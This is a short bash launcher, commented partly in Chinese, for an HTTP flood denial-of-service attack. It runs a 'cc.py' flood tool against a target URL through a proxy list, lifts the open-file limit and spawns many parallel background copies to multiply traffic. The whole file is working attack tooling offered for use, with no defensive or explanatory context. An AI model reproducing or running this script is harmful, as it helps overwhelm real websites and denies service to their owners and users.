#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec
atk_cmd="python3 cc.py -url $1 -t $2 -v http -s $3"

#number of process that you want
process=$4

#change the system limit
ulimit -n 999999

echo "命令：$atk_cmd"
echo "线程：$4"
# shellcheck disable=SC2004
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done